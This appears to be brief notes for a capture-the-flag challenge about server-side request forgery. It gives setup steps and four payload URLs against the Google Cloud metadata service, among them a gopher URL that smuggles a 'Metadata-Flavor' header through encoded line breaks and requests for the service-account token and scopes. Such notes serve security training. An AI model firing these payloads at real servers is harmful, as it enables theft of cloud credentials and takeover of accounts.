## CTF

## /secure_app/
A more secure way of doing things. Requests the URL from the user's browser instead of requesting from the server

## setup

* docker build & push to GCR - 
* pulumi up

gopher://metadata.google.internal:80/computeMetadata/v1/instance/machine-type%20HTTP/1.1%0AMetadata-Flavor:%20Google%0A%0A

http://metadata/computeMetadata/v1/

http://metadata/instanceMetadata/v1/instance/service-accounts/default/token

metadata/instanceMetadata/v1/instance/service-accounts/default/scopes